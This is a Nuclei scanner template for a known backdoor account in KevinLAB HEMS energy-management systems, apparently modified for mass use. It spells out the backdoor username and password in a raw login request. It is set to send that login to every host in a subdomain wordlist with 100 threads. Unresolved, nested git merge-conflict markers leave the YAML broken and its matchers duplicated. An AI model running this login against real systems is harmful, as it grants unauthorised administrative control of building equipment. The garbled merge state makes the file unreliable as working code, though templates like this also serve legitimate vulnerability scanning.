id: kevinlab-hems-backdoor

info:
<<<<<<< HEAD
  name: KevinLAB HEMS Undocumented Backdoor Account
  author: gy741
  severity: critical
  description: The HEMS solution has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution thru the RMI. Attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.
  reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
=======
  name: KevinLAB HEMS - Backdoor Detection
  author: gy741
  severity: critical
  description: |
    KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
>>>>>>> 5d36d276 (add new stuff)
  tags: kevinlab,default-login,backdoor

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        POST /dashboard/proc.php?type=login HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate
        Connection: close

        userid=kevinlab&userpass=kevin003
    matchers-condition: and
    matchers:

<<<<<<< HEAD
      - type: status
        status:
          - 200

      - type: word
=======
      - type: word
        part: body
>>>>>>> 5d36d276 (add new stuff)
        words:
          - '<meta http-equiv="refresh" content="0; url=/"></meta>'

      - type: word
        words:
          - '<script> alert'
        negative: true

      - type: word
<<<<<<< HEAD
        words:
          - 'PHPSESSID'
<<<<<<< HEAD
        part: header
=======
        part: header
        words:
          - 'PHPSESSID'

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/05/30
>>>>>>> 5d36d276 (add new stuff)
=======
        part: header
>>>>>>> 18ddf72b (add new stuff)
